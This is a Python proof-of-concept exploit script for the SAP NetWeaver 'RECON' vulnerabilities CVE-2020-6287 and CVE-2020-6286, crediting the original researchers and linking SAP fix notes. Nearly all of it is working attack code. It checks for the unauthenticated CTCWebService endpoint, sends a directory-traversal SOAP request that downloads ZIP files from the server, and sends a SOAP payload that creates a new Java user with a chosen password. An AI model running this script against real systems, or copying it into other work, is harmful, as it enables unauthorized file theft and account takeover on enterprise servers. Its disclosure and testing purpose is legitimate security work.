#!/usr/bin/env python3

__author__ = 'chipik'

import base64
import random
import requests
import argparse
import xml.etree.ElementTree as ET

help_desc = '''
PoC for CVE-2020-6287,  (RECON)
This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
Original finding: 
- Pablo Artuso. https://twitter.com/lmkalg
- Yvan 'iggy' G https://twitter.com/_1ggy
Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
'''


def detect_vuln(base_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"}
    status = 'OK'
    checks =  {"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":200}
    ans = requests.head(base_url + checks['path'], headers=headers, timeout=timeout, allow_redirects=False, verify=False)
    status_code = ans.status_code
    is_vulnerable = False
    ret_url=''
    # Check the status code
    if status_code == checks['sign_status']:
            is_vulnerable = True
            status = 'Vulnerable! [CVE-2020-6287] (RECON)'
            print ("%s - %s - %s" %(checks['name'], status, base_url + checks['path'] ))
            ret_url = base_url + checks['path']
    else:
        print ("%s - %s" %(checks['name'], status))
    return {"status":is_vulnerable, "url":ret_url}


def exploit_traversal(url, zipfile):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6286 PoC",
        "Content-Type":"text/xml;charset=UTF-8"}
    xml = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:queryProtocol>
         <sessionID>/../../../../../../../../../../../../../../../../../..%s</sessionID>
      </urn:queryProtocol>
   </soapenv:Body>
</soapenv:Envelope>
    ''' % (zipfile.replace(".zip",""))
    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
    if ans.status_code == 200:
        myroot = ET.fromstring(ans.content)
        zipb64 = ''
        for ret_val in myroot.iter('return'):
            zipb64 = ret_val.text
        if zipb64:
            zipdata = base64.b64decode(zipb64)
            filename = "zipfile_%d.zip" %(random.randint(1, 10000))
            with open(filename, 'wb') as f:
                f.write(zipdata)
            print("Ok! File %s was saved" % (filename))
        else:
            print("Error! Can't read file %s. Look's like there is no file %s on the server" % (zipfile, zipfile))
    else:
        print("Error! Can't read file %s. Status: %s" % (zipfile, ans.status_code))
    return

def generate_CreateUser_paylod():
    username = "sapRpoc%d" % (random.randint(5000, 10000))
    password = "Secure!PwD%d" % (random.randint(5000, 10000))
    p = "<root><user><JavaOrABAP>java</JavaOrABAP><username>%s</username><password>%s</password><userType>J</userType></user></root>" % (username, password)
    print("Going to create new user. %s:%s" % (username, password))
    return base64.b64encode(p.encode('utf-8')).decode('utf-8')

def exploit_createUser(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
        "Content-Type": "text/xml;charset=UTF-8"}
    payload = generate_CreateUser_paylod()
    xml = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
               <soapenv:Header/>
               <soapenv:Body>
                  <urn:executeSynchronious>
                     <identifier>
                        <component>sap.com/tc~lm~config~content</component>
                        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
                        <type></type>
                     </identifier>
                     <contextMessages>
                        <baData>
                        %s</baData>
                        <name>userDetails</name>
                     </contextMessages>
                  </urn:executeSynchronious>
               </soapenv:Body>
            </soapenv:Envelope>
        ''' % (payload)
    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
    if ans.status_code == 200:
        print("Ok! User were created")
    else:
        print("Error! Can't create user. Status: %s" % (ans.status_code))
    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='127.0.0.1', help='Java NW host (default: 127.0.0.1)')
    parser.add_argument('-P', '--port', default=50000, type=int, help='Java NW web port (default: tcp/50000)')
    parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
    parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
    parser.add_argument('-f', '--zipfile', default='', help='ZIP file to read. CVE-2020-6286')
    parser.add_argument('-u', '--user', action='store_true', help='Create JAVA user. CVE-2020-6287')
    parser.add_argument('--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
    args = parser.parse_args()
    timeout = args.timeout

    if args.ssl:
        base_url = "https://%s:%s" % (args.host, args.port)
    else:
        base_url = "http://%s:%s" % (args.host, args.port)
    if args.check:
        detect_vuln(base_url)
        exit()
    if args.zipfile:
        result = detect_vuln(base_url)
        if result["status"]:
            exploit_traversal(result["url"].replace("?wsdl",""),args.zipfile)
    if args.user:
        result = detect_vuln(base_url)
        if result["status"]:
            exploit_createUser(result["url"].replace("?wsdl", ""))

